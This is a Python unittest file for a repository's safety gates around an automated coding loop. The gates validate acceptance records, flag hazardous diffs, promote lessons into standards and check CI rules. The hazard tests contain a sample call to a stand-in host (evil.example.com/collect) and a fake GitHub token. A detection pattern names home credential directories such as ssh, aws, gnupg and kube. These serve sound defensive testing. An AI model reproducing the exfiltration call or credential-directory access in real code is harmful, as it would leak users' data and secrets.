"""三道门的测试。

这些测试就是“没有这次改动就会失败”的那种：把 assert 里的行为去掉，
它们会真的红。跑法：python -m unittest discover -s tests -t .
"""

from __future__ import annotations

import itertools
import json
import re
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from gates import acceptance_check as acc
from gates import hazard_check as hz
from gates import lessons_promote as lp
from gates import selfcheck as sc

FIXTURES = REPO_ROOT / "tests" / "fixtures"
LESSONS_FIXTURE = FIXTURES / "lessons_sample.md"


# --------------------------------------------------------------------------- 验收门


GOOD_TEXT = """fix: dashboard crash on empty list

Acceptance:
Source: x/@devon (v0.1.3336)
Cause: 空列表时取了 items[0]，越界。
Change: 先判空再取，补了一条空列表的测试。
Verified:
  - macos-15 arm64 | full suite | PASS
  - wsl ubuntu, /bin/sh=dash | test_hook | PASS
Red/Green:
  - revert old code: FAIL (IndexError)
  - apply new code: PASS
Not run:
  - 真实 NAS (没有设备)
"""


class AcceptanceTests(unittest.TestCase):
    def test_good_text_passes(self) -> None:
        record = acc.parse_text(GOOD_TEXT)
        problems, _ = acc.validate(record)
        self.assertEqual([], problems)

    def test_missing_not_run_is_rejected(self) -> None:
        text = GOOD_TEXT.split("Not run:")[0]
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("Not run" in p for p in problems), problems)

    def test_red_without_fail_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("  - revert old code: FAIL (IndexError)\n", "")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("FAIL" in p for p in problems), problems)

    def test_empty_not_run_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("  - 真实 NAS (没有设备)", "")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("Not run" in p for p in problems), problems)

    def test_none_not_run_passes(self) -> None:
        text = GOOD_TEXT.replace("  - 真实 NAS (没有设备)", "  - none")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertEqual([], problems)

    def test_generic_excuse_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("Cause: 空列表时取了 items[0]，越界。", "Cause: 修复了一些问题")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("空话" in p for p in problems), problems)

    def test_verified_missing_where_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("  - macos-15 arm64 | full suite | PASS", "  - | full suite | PASS")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("在哪跑" in p for p in problems), problems)

    def test_loop_may_not_edit_own_rules(self) -> None:
        text = GOOD_TEXT + "\n"
        record = acc.parse_text(text)
        record["files"] = ["AGENTS.md"]
        problems, _ = acc.validate(record)
        self.assertTrue(any("受保护" in p for p in problems), problems)

    def test_json_fixture_passes(self) -> None:
        data = json.loads((FIXTURES / "acceptance_ok.json").read_text(encoding="utf-8"))
        problems, _ = acc.validate(data)
        self.assertEqual([], problems)

    def test_bad_fixture_fails(self) -> None:
        data = json.loads((FIXTURES / "acceptance_bad.json").read_text(encoding="utf-8"))
        problems, _ = acc.validate(data)
        self.assertTrue(len(problems) >= 3, problems)


# --------------------------------------------------------------------------- 危害门


def diff_for(path: str, *lines: str) -> str:
    body = "\n".join("+" + line for line in lines)
    return f"--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{len(lines)} @@\n{body}\n"


def findings_for(diff: str, files: list[str] | None = None) -> list[dict[str, str]]:
    rules = hz.load_rules()
    diff_files, changed = hz.parse_diff(diff)
    return hz.check(files or changed, diff_files, rules)


class HazardTests(unittest.TestCase):
    def test_ci_config_is_blocked(self) -> None:
        found = findings_for(diff_for(".github/workflows/ci.yml", "on: push"), [".github/workflows/ci.yml"])
        self.assertTrue(any(f["rule"] == "H1" for f in found), found)

    def test_release_script_is_blocked(self) -> None:
        found = findings_for("", ["scripts/release.sh"])
        self.assertTrue(any(f["kind"] == "ci_release" for f in found), found)

    def test_dependency_file_is_blocked(self) -> None:
        found = findings_for("", ["package.json"])
        self.assertTrue(any(f["kind"] == "dependency_change" for f in found), found)

    def test_new_external_url_is_blocked(self) -> None:
        found = findings_for(diff_for("app/net.py", 'urlopen("https://evil.example.com/collect")'))
        self.assertTrue(any(f["rule"] == "H2" for f in found), found)

    def test_known_host_is_allowed(self) -> None:
        found = findings_for(diff_for("app/net.py", 'urlopen("https://github.com/example/repo")'))
        self.assertFalse(any(f["rule"] == "H2" for f in found), found)

    def test_credential_leak_is_blocked(self) -> None:
        found = findings_for(diff_for("app/auth.py", 'TOKEN = "ghp_' + "a" * 36 + '"'))
        self.assertTrue(any(f["rule"] == "H4" for f in found), found)

    def test_credential_file_is_blocked(self) -> None:
        found = findings_for("", ["config/.env"])
        self.assertTrue(any(f["kind"] == "credential_access" for f in found), found)

    def test_promotion_link_is_blocked(self) -> None:
        found = findings_for(diff_for("docs/index.md", "[best relay](https://relay.example.com/?ref=abc)"))
        self.assertTrue(any(f["rule"] == "H6" for f in found), found)

    def test_promo_word_alone_is_not_blocked(self) -> None:
        """写文档解释这条规则时必然会提到这些词，不能因此把自己拦住。"""
        found = findings_for(diff_for("docs/rules.md", "危害门会拦推广链接、中转站和返利口令。"))
        self.assertFalse(any(f["rule"] == "H6" for f in found), found)

    def test_promo_word_with_link_is_blocked(self) -> None:
        found = findings_for(
            diff_for("docs/sponsors.md", "[加速节点](https://relay.example.com/x) 这是我们的返利入口")
        )
        self.assertTrue(any(f["rule"] == "H6" for f in found), found)

    def test_opaque_blob_is_blocked(self) -> None:
        blob = "A" * 40 + "8f3k2m9q7w1e5r6t0y4u2i3o8p7a6s5d" * 6
        found = findings_for(diff_for("app/payload.py", f'DATA = "{blob}"'))
        self.assertTrue(any(f["kind"] == "opaque_blob" for f in found), found)

    def test_plain_code_passes(self) -> None:
        found = findings_for(diff_for("app/logic.py", "def add(a, b):", "    return a + b"))
        self.assertEqual([], found)

    def test_blocklisted_author_is_blocked(self) -> None:
        rules = hz.load_rules()
        found = hz.check([], [], rules, author="bad-actor", blocklist={"github/bad-actor"})
        self.assertTrue(any(f["rule"] == "BLOCK" for f in found), found)


# --------------------------------------------------------------------------- 错题本


class LessonTests(unittest.TestCase):
    """错题本的解析与晋升。

    这几个用例读 tests/fixtures/lessons_sample.md，**不读活仓库的 LESSONS.md** ——
    活仓库那本会随 `python -m gates.lessons_promote --apply` 变化（够格的条目挪进
    docs/CODE_STANDARDS.md 后就从错题本里消失了），用例跟着它变就会在一次晋升后
    自己跑红：2026-11-19 第一次真跑 --apply 时，L-001 / L-002 一晋升，
    selfcheck 的 46 条单测当场挂掉 1 失败 + 2 错误。

    晋升本身改写文件，所以这里把 lp.LESSONS / lp.STANDARDS / lp.CI_RULES 全指到
    临时目录 —— 单测不许碰仓库里的真文件（见错题本 L-002）。
    """

    def setUp(self) -> None:
        tmp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(tmp_dir.cleanup)
        tmp = Path(tmp_dir.name)

        self.lessons_path = tmp / "LESSONS.md"
        self.standards_path = tmp / "CODE_STANDARDS.md"
        self.lessons_path.write_text(
            LESSONS_FIXTURE.read_text(encoding="utf-8"), encoding="utf-8"
        )
        self.standards_path.write_text(
            "head\n<!-- promoted-zone:start -->\n<!-- promoted-zone:end -->\ntail\n",
            encoding="utf-8",
        )

        saved = (lp.LESSONS, lp.STANDARDS, lp.CI_RULES)
        self.ci_rules_path = tmp / "ci_rules.json"
        lp.LESSONS = self.lessons_path
        lp.STANDARDS = self.standards_path
        lp.CI_RULES = self.ci_rules_path

        def restore() -> None:
            lp.LESSONS, lp.STANDARDS, lp.CI_RULES = saved

        self.addCleanup(restore)

    def test_parses_all_lessons(self) -> None:
        _, lessons = lp.load_lessons(LESSONS_FIXTURE)
        self.assertEqual(["L-001", "L-002", "L-005"], [x.id for x in lessons])
        self.assertEqual("修之前先原样复现", lessons[0].title)

    def test_three_distinct_days_is_ready(self) -> None:
        _, lessons = lp.load_lessons(LESSONS_FIXTURE)
        by_id = {lesson.id: lesson for lesson in lessons}
        self.assertTrue(lp.ready(by_id["L-001"]))
        self.assertFalse(lp.ready(by_id["L-005"]))

    def test_machine_checkable_is_read(self) -> None:
        _, lessons = lp.load_lessons(LESSONS_FIXTURE)
        by_id = {lesson.id: lesson for lesson in lessons}
        self.assertTrue(by_id["L-002"].machine_checkable)
        self.assertFalse(by_id["L-001"].machine_checkable)

    def test_apply_dry_run_writes_nothing(self) -> None:
        lessons_before = self.lessons_path.read_text(encoding="utf-8")
        standards_before = self.standards_path.read_text(encoding="utf-8")
        _, lessons = lp.load_lessons(self.lessons_path)
        lp.cmd_apply(lessons, "2026-11-17", dry_run=True)
        self.assertEqual(lessons_before, self.lessons_path.read_text(encoding="utf-8"))
        self.assertEqual(standards_before, self.standards_path.read_text(encoding="utf-8"))

    def test_apply_promotes_ready_and_keeps_the_rest(self) -> None:
        """真晋升一次（不碰真仓库）：够格的进规范，剩下的留在错题本。"""
        _, lessons = lp.load_lessons(self.lessons_path)
        moved = lp.cmd_apply(lessons, "2026-11-19")
        self.assertEqual(2, moved)

        standards = self.standards_path.read_text(encoding="utf-8")
        self.assertIn("<!-- promoted:L-001 -->", standards)
        self.assertIn("<!-- promoted:L-002 -->", standards)

        _, remaining = lp.load_lessons(self.lessons_path)
        self.assertEqual(["L-005"], [x.id for x in remaining])

    def test_apply_writes_ci_stub_only_for_machine_checkable(self) -> None:
        """L-002 标着 Machine-checkable: true → 落一条 CI 规则桩（enabled=false）。"""
        _, lessons = lp.load_lessons(self.lessons_path)
        lp.cmd_apply(lessons, "2026-11-19")
        rules = lp.load_ci_rules(self.lessons_path.parent / "ci_rules.json")["rules"]
        self.assertEqual(["L-002"], [r["id"] for r in rules])
        self.assertFalse(rules[0]["enabled"])

    def _write_ci_rules(self, rules: list[dict]) -> None:
        """在临时目录里造一份 CI 规则表（绝不碰仓库里的真文件）。"""
        payload = {"version": 1, "_comment": "单测夹具", "rules": rules}
        self.ci_rules_path.write_text(
            json.dumps(payload, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
        )

    def _promoted_block(self, lesson_id: str) -> str:
        """从晋升后的规范里抠出某条教训的块。"""
        standards = self.standards_path.read_text(encoding="utf-8")
        marker = f"<!-- promoted:{lesson_id} -->"
        self.assertIn(marker, standards)
        return standards.split(marker, 1)[1].split("<!-- promoted-zone:end -->", 1)[0]

    def test_promote_block_defaults_to_pending(self) -> None:
        """没查表（默认 ci_ready=False）→ 保守写「尚未实现，待补正则」。"""
        _, lessons = lp.load_lessons(self.lessons_path)
        lesson = next(x for x in lessons if x.id == "L-002")
        block = lp.promote_block(lesson, "2026-11-19")
        self.assertIn("尚未实现，待补正则", block)
        self.assertNotIn("已实现", block)

    def test_promote_block_reports_implemented_when_ci_ready(self) -> None:
        """查表说是「真规则」→ 写「已实现」，不再写「尚未实现」。"""
        _, lessons = lp.load_lessons(self.lessons_path)
        lesson = next(x for x in lessons if x.id == "L-002")
        block = lp.promote_block(lesson, "2026-11-19", ci_ready=True)
        self.assertIn("已实现", block)
        self.assertNotIn("尚未实现", block)

    def test_ci_rule_ready_reads_the_rule_table(self) -> None:
        """真规则 = enabled + pattern 齐；空桩 / 别的 id 都不算。"""
        cases = [
            ({"id": "L-002", "enabled": True, "pattern": "x"}, True),
            ({"id": "L-002", "enabled": True, "pattern": ""}, False),
            ({"id": "L-002", "enabled": False, "pattern": "x"}, False),
            ({"id": "L-002", "enabled": False, "pattern": None}, False),
            ({"id": "L-999", "enabled": True, "pattern": "x"}, False),
        ]
        for rule, expected in cases:
            with self.subTest(rule=rule):
                self._write_ci_rules([rule])
                self.assertEqual(expected, lp.ci_rule_ready("L-002"))

    def test_ci_rule_ready_when_the_table_cannot_be_read(self) -> None:
        """规则表缺失 / 坏掉 → 当「不是真规则」，别把晋升搞挂。"""
        self.assertFalse(self.ci_rules_path.exists())
        self.assertFalse(lp.ci_rule_ready("L-002"))
        self.ci_rules_path.write_text("{ 坏掉的 JSON", encoding="utf-8")
        self.assertFalse(lp.ci_rule_ready("L-002"))

    def test_apply_says_implemented_when_the_rule_is_real(self) -> None:
        """端到端：规则已实现 → 晋升块写「已实现」，不写「尚未实现」。"""
        self._write_ci_rules(
            [
                {
                    "id": "L-002",
                    "title": "测试只许在临时目录里跑",
                    "enabled": True,
                    "pattern": "x",
                    "scope": ["tests/*.py"],
                }
            ]
        )
        _, lessons = lp.load_lessons(self.lessons_path)
        lp.cmd_apply(lessons, "2026-11-19")
        block = self._promoted_block("L-002")
        self.assertIn("已实现", block)
        self.assertNotIn("尚未实现", block)

    def test_apply_says_pending_when_the_rule_is_missing(self) -> None:
        """端到端：规则表里没有 L-002 → 仍是「尚未实现，待补正则」。"""
        _, lessons = lp.load_lessons(self.lessons_path)
        lp.cmd_apply(lessons, "2026-11-19")
        block = self._promoted_block("L-002")
        self.assertIn("尚未实现，待补正则", block)
        self.assertNotIn("已实现", block)

    def test_apply_keeps_an_implemented_ci_rule_intact(self) -> None:
        """回归：已实现的规则不许被回退成桩 —— 前后一字不改。"""
        self._write_ci_rules(
            [
                {
                    "id": "L-002",
                    "title": "测试只许在临时目录里跑",
                    "why": "自动化循环把维护者的凭据写坏了。",
                    "evidence": "8b41d07, #388",
                    "enabled": True,
                    "pattern": "x",
                    "scope": ["tests/*.py"],
                    "note": "已实现",
                }
            ]
        )
        before = self.ci_rules_path.read_text(encoding="utf-8")
        _, lessons = lp.load_lessons(self.lessons_path)
        lp.cmd_apply(lessons, "2026-11-19")
        self.assertEqual(before, self.ci_rules_path.read_text(encoding="utf-8"))

    def test_apply_keeps_a_stub_ci_rule_intact(self) -> None:
        """回归：已有的空桩也不许被覆盖 / 改写。"""
        self._write_ci_rules(
            [
                {
                    "id": "L-002",
                    "title": "测试只许在临时目录里跑",
                    "enabled": False,
                    "pattern": None,
                    "scope": [],
                }
            ]
        )
        before = self.ci_rules_path.read_text(encoding="utf-8")
        _, lessons = lp.load_lessons(self.lessons_path)
        lp.cmd_apply(lessons, "2026-11-19")
        self.assertEqual(before, self.ci_rules_path.read_text(encoding="utf-8"))
        self.assertIn("尚未实现，待补正则", self._promoted_block("L-002"))

    def test_append_ci_stub_never_overwrites_an_existing_rule(self) -> None:
        """append_ci_stub 按 id 去重：规则已在（含已实现的）就原样留着。"""
        self._write_ci_rules(
            [{"id": "L-002", "enabled": True, "pattern": "x", "scope": ["tests/*.py"]}]
        )
        before = self.ci_rules_path.read_text(encoding="utf-8")
        _, lessons = lp.load_lessons(self.lessons_path)
        lesson = next(x for x in lessons if x.id == "L-002")
        self.assertFalse(lp.append_ci_stub(lesson))
        self.assertEqual(before, self.ci_rules_path.read_text(encoding="utf-8"))

    def test_zone_insert_keeps_markers(self) -> None:
        text = "head\n<!-- promoted-zone:start -->\nold\n<!-- promoted-zone:end -->\ntail\n"
        out = lp.insert_into_zone(text, ["new-block\n"])
        self.assertIn("new-block", out)
        self.assertIn("old", out)
        self.assertLess(out.index("promoted-zone:start"), out.index("new-block"))
        self.assertLess(out.index("new-block"), out.index("promoted-zone:end"))


# --------------------------------------------------------------------------- CI 规则


class CiRuleTests(unittest.TestCase):
    """config/ci_rules.json 里启用的规则：真会查，而且查得准。

    夹具一律落在临时目录（错题本 L-002 本身的要求）：
    违规样本写进临时目录里的假仓库，模块全局 REPO_ROOT / CI_RULES 指过去，
    用完还原 —— 绝不碰仓库里的真文件。

    样本里的配置目录名单独放一行：拼样本时它与 home 引用不在同一行。
    否则本文件自己就在 L-002 的 scope 里，会把这条规则的测试自己拦下来。
    """

    CFG_DIR = ".claude"

    def setUp(self) -> None:
        tmp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(tmp_dir.cleanup)
        self.tmp = Path(tmp_dir.name)

        saved = (sc.REPO_ROOT, sc.CI_RULES)
        sc.REPO_ROOT = self.tmp
        sc.CI_RULES = self.tmp / "config" / "ci_rules.json"

        def restore() -> None:
            sc.REPO_ROOT, sc.CI_RULES = saved

        self.addCleanup(restore)

    def _use_real_repo(self) -> None:
        sc.REPO_ROOT = REPO_ROOT
        sc.CI_RULES = REPO_ROOT / "config" / "ci_rules.json"

    def _copy_real_rules(self) -> None:
        """把真规则表拷进临时仓库 —— 测的是真 pattern，不是抄一份改名的。"""
        (self.tmp / "config").mkdir(parents=True, exist_ok=True)
        src = REPO_ROOT / "config" / "ci_rules.json"
        (self.tmp / "config" / "ci_rules.json").write_text(
            src.read_text(encoding="utf-8"), encoding="utf-8"
        )

    def _rule(self) -> dict:
        data = json.loads((REPO_ROOT / "config" / "ci_rules.json").read_text(encoding="utf-8"))
        return next(r for r in data["rules"] if r["id"] == "L-002")

    def test_l002_rule_is_enabled_and_has_a_pattern(self) -> None:
        """L-002 不再是桩：enabled=true 且 pattern / scope 都填上了。"""
        rule = self._rule()
        self.assertTrue(rule["enabled"], rule)
        self.assertTrue(rule["pattern"], rule)
        self.assertTrue(rule["scope"], rule)

    def test_l002_reports_a_violation_in_a_temp_fixture(self) -> None:
        """规则被真正执行：临时假仓库里的违规写法必须被报出来。"""
        self._copy_real_rules()
        (self.tmp / "tests").mkdir(parents=True, exist_ok=True)
        bad_line = "cfg = Path.home() / " + '"' + self.CFG_DIR + '"' + "\n"
        (self.tmp / "tests" / "test_bad.py").write_text(bad_line, encoding="utf-8")

        violations, pending = sc.check_ci_rules()
        hits = [v for v in violations if v.startswith("L-002 ")]
        self.assertTrue(hits, violations)
        self.assertIn("tests/test_bad.py:1", hits[0])
        self.assertEqual([], [p for p in pending if p.startswith("L-002")])

    def test_l002_does_not_flag_temp_dir_paths(self) -> None:
        """临时目录里造一个同名配置目录不算违规 —— 别把自己人拦下来。"""
        self._copy_real_rules()
        (self.tmp / "tests").mkdir(parents=True, exist_ok=True)
        ok_line = "cfg = tmp_path / " + '"' + self.CFG_DIR + '"' + "\n"
        (self.tmp / "tests" / "test_ok.py").write_text(ok_line, encoding="utf-8")

        violations, _ = sc.check_ci_rules()
        self.assertEqual([], [v for v in violations if v.startswith("L-002 ")])

    def test_l002_is_clean_on_the_real_repo(self) -> None:
        """当前仓库必须干净：命中数 0，而且 L-002 不再被列成「还是桩」。"""
        self._use_real_repo()
        violations, pending = sc.check_ci_rules()
        self.assertEqual([], [v for v in violations if v.startswith("L-002 ")])
        self.assertEqual([], [p for p in pending if p.startswith("L-002")])


# --------------------------------------------------------------------------- 剪枝


class PruneTests(unittest.TestCase):
    """扫描剪枝：剪掉的目录里不许有真代码，被剪的必须是确切的路径。

    这几条是剪枝的**安全绳**：
      1. 剪枝按「锚定相对路径」而不是按目录名 —— 否则将来有人建一个叫
         `server/dist/` 的源码目录会被静默剪掉，真代码不进检查圈；
      2. 哨兵：被跟踪的文件一条都不许落在被剪目录下（纯函数，不依赖 git）。
    """

    def _make_repo(self) -> Path:
        tmp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(tmp_dir.cleanup)
        root = Path(tmp_dir.name)
        for rel in (
            "src/main.py",
            "server/app.py",
            "server/dist/keep.py",   # 同名但不是仓库根的 dist —— 必须照扫
            "build/out.py",           # 锚定命中 —— 必须剪掉
            "app/build/out.py",       # 锚定命中 —— 必须剪掉
            "tmp/scratch.py",         # 锚定命中 —— 必须剪掉
            "third_party/dep/x.py",   # 锚定命中 —— 必须剪掉
            "server/data/messages.jsonl",  # 用户真实数据 —— 必须剪掉
            "app/.cxx/ndk/thing.o",  # NDK 产物 —— 必须剪掉
            ".venv/lib/x.py",         # 点目录名 —— 必须剪掉
            "docs/notes.md",
        ):
            target = root / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text("x\n", encoding="utf-8")
        return root

    def _iter_names(self, root: Path) -> set[str]:
        saved = sc.REPO_ROOT
        sc.REPO_ROOT = root
        try:
            return {p.relative_to(root).as_posix() for p in sc.iter_repo_files()}
        finally:
            sc.REPO_ROOT = saved

    def test_pruned_paths_are_not_scanned(self) -> None:
        scanned = self._iter_names(self._make_repo())
        for rel in (
            "build/out.py",
            "app/build/out.py",
            "tmp/scratch.py",
            "third_party/dep/x.py",
            "server/data/messages.jsonl",
            "app/.cxx/ndk/thing.o",
            ".venv/lib/x.py",
        ):
            self.assertNotIn(rel, scanned, rel)

    def test_source_files_are_scanned(self) -> None:
        scanned = self._iter_names(self._make_repo())
        for rel in ("src/main.py", "server/app.py", "docs/notes.md"):
            self.assertIn(rel, scanned, rel)

    def test_nested_dist_is_not_pruned_by_name(self) -> None:
        """`server/dist/` 不是仓库根的 dist —— 锚定剪枝不许把它误剪。"""
        scanned = self._iter_names(self._make_repo())
        self.assertIn("server/dist/keep.py", scanned)

    def test_sentinel_flags_a_tracked_file_under_a_pruned_path(self) -> None:
        violations = sc.pruned_tracked_violations(["build/keep.py"])
        self.assertEqual(1, len(violations), violations)
        self.assertIn("build/", violations[0])

    def test_sentinel_flags_nested_and_dot_dirs(self) -> None:
        self.assertEqual(1, len(sc.pruned_tracked_violations(["app/build/x.kt"])))
        self.assertEqual(1, len(sc.pruned_tracked_violations(["server/data/messages.jsonl"])))
        self.assertEqual(1, len(sc.pruned_tracked_violations([".venv/lib/x.py"])))
        self.assertEqual(1, len(sc.pruned_tracked_violations(["app/.cxx/a.o"])))

    def test_sentinel_is_quiet_on_normal_files(self) -> None:
        self.assertEqual([], sc.pruned_tracked_violations([
            "src/main.py",
            "server/app.py",
            "server/dist/keep.py",
            "docs/notes.md",
            "app/src/main/java/com/notifyme/android/AnalysisCase.kt",
        ]))

    def test_sentinel_matches_the_real_repo(self) -> None:
        """真仓库：被跟踪文件一条都不许落在被剪目录下。"""
        violations, note = sc.check_pruned_tracked()
        self.assertEqual([], violations, note)


# --------------------------------------------------------------------------- 预筛


# L-002「必须被抓到」的写法清单放在夹具文件里，不写在测试源码里 ——
# 原因：tests/ 本身在 L-002 的 scope 内，把违规行写进 .py 源码，
# 引擎会把**这个测试文件自己**判成违规（2026-11-19 实测踩到过）。
L002_VIOLATIONS_FIXTURE = FIXTURES / "l002_violations.txt"


def known_violations() -> list[str]:
    """读 L-002 的已知违规样本（每行一条）。"""
    return [
        line
        for line in L002_VIOLATIONS_FIXTURE.read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]


class PrefilterTests(unittest.TestCase):
    """必要条件预筛：快，但不能因此漏报。

    prefilter 是一组字面子串，引擎先用廉价的 `in` 挡掉无关行，再跑那条昂贵的正则。
    风险只有一个 —— **写窄了会静默漏报**。这里用两条护栏钉住：
      1. 每条 KNOWN_VIOLATIONS 都必须既命中 pattern 又通过 prefilter；
      2. 同一批样本上，带 prefilter 与不带 prefilter 的判定结果必须完全一致。
    """

    def _rule(self) -> dict:
        data = json.loads((REPO_ROOT / "config" / "ci_rules.json").read_text(encoding="utf-8"))
        return next(r for r in data["rules"] if r["id"] == "L-002")

    def test_known_violations_still_match_the_pattern(self) -> None:
        rule = self._rule()
        compiled = re.compile(rule["pattern"])
        for line in known_violations():
            with self.subTest(line=line):
                self.assertTrue(compiled.search(line), f"这条应该被 pattern 命中：{line}")

    def test_known_violations_pass_the_prefilter(self) -> None:
        """护栏一：已知违规行必须都能通过预筛 —— 否则规则会静默漏报。"""
        rule = self._rule()
        tokens = sc.rule_prefilter(rule)
        self.assertTrue(tokens, "L-002 应当配了 prefilter")
        for line in known_violations():
            with self.subTest(line=line):
                self.assertTrue(
                    any(token in line for token in tokens),
                    f"已知违规行过不了预筛 = 静默漏报：{line}",
                )

    def test_every_derived_token_is_covered_by_a_sample(self) -> None:
        """每个派生 token 都必须被至少一条已知违规样本用到。

        派生 token 来自 pattern 的命名组，改 pattern 就会改 token 集合；
        这条用例保证「token 集合」与「样本集合」不会各走各的 ——
        新加一个命名组却没加样本时，当场红。
        """
        rule = self._rule()
        tokens = sc.rule_prefilter(rule)
        samples = known_violations()
        for token in tokens:
            with self.subTest(token=token):
                self.assertTrue(
                    any(token in line for line in samples),
                    f"派生 token {token!r} 没有任何已知样本覆盖",
                )

    def test_prefilter_is_derived_not_handwritten(self) -> None:
        """预筛必须是**派生**的：规则表里不许再出现 prefilter 字段。

        手抄的 prefilter 是 pattern 的第二份真相 —— 改了 pattern 忘了同步预筛，
        规则就会静默漏报（2026-11-19 在真仓库副本上端到端复现过：
        pattern 加一个目录名、prefilter 没同步，违规文件躺在仓库里、测试全绿、引擎报 0 条）。
        """
        rule = self._rule()
        self.assertNotIn("prefilter", rule, "规则表里不该再有手抄的 prefilter 字段")
        self.assertTrue(rule["pattern"].count("(?P<"), "pattern 里应该有命名组供引擎派生 token")

    def test_derived_tokens_come_from_the_named_groups(self) -> None:
        """派生 token 必须正好是各命名组的候选字面量（不多不少）。"""
        rule = self._rule()
        expected = [
            "HOME", "USERPROFILE", "HOMEDRIVE", "HOMEPATH",
            "claude", "config", "aws", "ssh", "gnupg", "kube", "docker", "gem", "npm",
        ]
        self.assertEqual(expected, sc.rule_prefilter(rule))

    def test_every_generated_violation_passes_the_prefilter(self) -> None:
        """性质测试：凡是被 pattern 命中的行，都必须过得了预筛。

        语料由「home 引用形态 × 配置目录形态」组合生成（配置目录名从命名组里取，
        所以 pattern 加了新的目录名，语料也跟着长）。这是「预筛是必要条件」的
        机器验证 —— 比样本护栏覆盖面大得多。
        """
        rule = self._rule()
        compiled = re.compile(rule["pattern"])
        tokens = sc.rule_prefilter(rule)
        dirs = re.search(r"\(\?P<dirs>([^)]*)\)", rule["pattern"]).group(1).split("|")
        homes = [
            'Path.home()',
            'os.path.expanduser("~")',
            'os.environ["HOME"]',
            'os.environ["USERPROFILE"]',
            'os.environ.get("HOME")',
            'os.getenv("HOMEDRIVE")',
            '"~"',
        ]
        corpus = []
        for home, d in itertools.product(homes, dirs):
            corpus.append(f'x = {home} / ".{d}"')
            corpus.append(f'x = ".{d}" / {home}')
        # 拆开写：这一行源码本身若含裸的 $HOME，会被 L-002 判成违规（分支 B）——
        # 测试文件自己就在 scope 里。样本真身放在夹具文件里。
        corpus.append('raw = ' + chr(34) + chr(36) + 'HOME' + chr(34))
        corpus.append('x = 1')
        for line in corpus:
            with self.subTest(line=line):
                if compiled.search(line):
                    self.assertTrue(
                        any(token in line for token in tokens),
                        f"命中 pattern 却过不了预筛 = 静默漏报：{line}",
                    )

    def test_prefilter_does_not_change_verdicts(self) -> None:
        """护栏二：同一批样本上，带 / 不带 prefilter 的判定必须完全一致。"""
        rule = self._rule()
        compiled = re.compile(rule["pattern"])
        tokens = sc.rule_prefilter(rule)

        samples = known_violations() + [
            'flask_app.config["MAX_CONTENT_LENGTH"] = 8 * 1024 * 1024',
            'self.config = {"a": 1}',
            '(tmp_path / ".claude").write_text("{}")',
            'home = Path.home()',
            'base = os.path.join(home, ".notifyme-tools")',
            'os.environ["HOME"] = str(tmp_path)',
        ]

        def judge(line: str, use_prefilter: bool) -> bool:
            if use_prefilter and not any(token in line for token in tokens):
                return False
            return bool(compiled.search(line))

        for line in samples:
            with self.subTest(line=line):
                self.assertEqual(judge(line, False), judge(line, True), line)

    def test_handwritten_prefilter_field_is_rejected(self) -> None:
        """规则表里写 prefilter 字段 → 判非法（那是 pattern 的第二份真相）。"""
        for bad in (["HOME"], "HOME", [""], [None], [123]):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    sc.rule_prefilter({"pattern": "x", "prefilter": bad})

    def test_rule_without_named_groups_has_no_fast_path(self) -> None:
        """没有命名组的规则照常工作（快路径是可选的，退回慢路径而已）。"""
        self.assertEqual([], sc.rule_prefilter({}))
        self.assertEqual([], sc.rule_prefilter({"pattern": "abc"}))
        self.assertEqual([], sc.rule_prefilter({"pattern": None}))


if __name__ == "__main__":
    unittest.main()
